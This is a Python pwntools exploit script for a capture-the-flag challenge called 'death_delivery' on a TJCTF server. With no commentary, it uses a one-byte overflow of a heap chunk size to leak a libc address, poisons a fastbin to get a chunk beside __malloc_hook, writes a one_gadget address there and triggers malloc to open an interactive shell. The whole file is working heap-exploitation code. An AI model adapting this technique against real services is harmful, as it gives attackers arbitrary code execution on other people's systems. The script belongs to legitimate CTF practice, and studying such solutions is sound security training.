#!coding:utf-8
#!/usr/bin/env python
from pwn import *
#context.log_level="debug"
#p=process("./death_delivery")
p=remote("p1.tjctf.org",8011)
libc=ELF("/home/anonymous/下载/1904055ca753093f654/libc-2.23.so")

def create(index,length,ctx=''):
    p.recvuntil("Enter the index of the name in the range [0,9]\n")
    p.sendline(str(index))
    p.recvuntil("Enter the length of the next name or -1 to delete that name or 0 to print that name\n")
    p.sendline(str(length))
    if(length != -1 or length != 0):
        p.send(ctx)

#gdb.attach(p)
create(0,0x20,"A\n")
create(1,0x20,"B\n")
create(2,0x60,"C\n")
create(3,0x10,"D\n")

create(0,-1)
create(0,0x28,"A"*0x28+"\xa1")

create(1,-1)
create(1,0x20,'a\n')

create(2,0)
libc_base=u64(p.recv(6)+"\x00\x00")-0x3c4b78
print_flag=0x000000000400929
print hex(libc_base)

malloc_hook=libc_base+libc.symbols['__malloc_hook']

target=malloc_hook-0x23

create(4,0x60,"g\n")
create(5,0x60,"hacked by potatso\n")

create(2,-1)
create(5,-1)
create(4,-1)
create(2,0x60,p64(target)+"\n")
create(5,0x60,"\n")
create(7,0x60,"\n")
one_gadget=libc_base+0x4526a
create(4,0x60,"a"*0x13+p64(one_gadget)+"\n")
p.recvuntil("Enter the index of the name in the range [0,9]\n")
p.sendline(str(9))
p.recvuntil("Enter the length of the next name or -1 to delete that name or 0 to print that name\n")
p.sendline(str(0x10))
p.interactive()
